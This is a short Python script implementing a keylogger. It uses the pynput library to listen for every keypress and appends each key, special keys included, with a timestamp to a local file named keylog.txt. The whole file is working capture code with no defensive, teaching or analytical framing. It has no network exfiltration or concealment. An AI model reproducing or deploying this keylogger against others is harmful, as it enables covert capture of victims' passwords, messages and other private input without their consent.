# Import necessary modules
from pynput import keyboard
import os
from datetime import datetime

# Define a function to log keystrokes
def on_press(key):
    try:
        # Open the file in append mode and log the keypress
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{datetime.now()}: {key.char}\n")
    except AttributeError:
        # Handle special keys and write them to the file
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{datetime.now()}: {key}\n")

# Start and stop the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Main function to run the keylogger
if __name__ == "__main__":
    start_keylogger()
